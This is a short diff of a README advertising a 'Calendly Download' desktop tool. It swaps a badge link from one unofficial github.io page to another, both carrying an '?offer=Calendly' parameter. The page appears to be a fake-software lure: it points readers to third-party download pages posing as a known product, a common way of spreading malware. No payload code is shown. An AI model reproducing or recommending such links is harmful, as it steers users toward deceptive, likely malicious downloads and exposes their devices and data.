@@ -1,10 +1,10 @@
 # Calendly Download — Desktop Scheduling & Calendar Tool
 
-<a href="https://dowloader-desktop-app.github.io/.github/?offer=Calendly" target="_blank">
+<a href="https://tools-git-app.github.io/.github/?offer=Calendly" target="_blank">
   <img 
-    src="https://img.shields.io/badge/Get%20Calendly%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
+    src="https://img.shields.io/badge/Calendly%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
-    alt="Get Calendly GitHub">
+    alt="Calendly GitHub">
 </a>
 
 ---
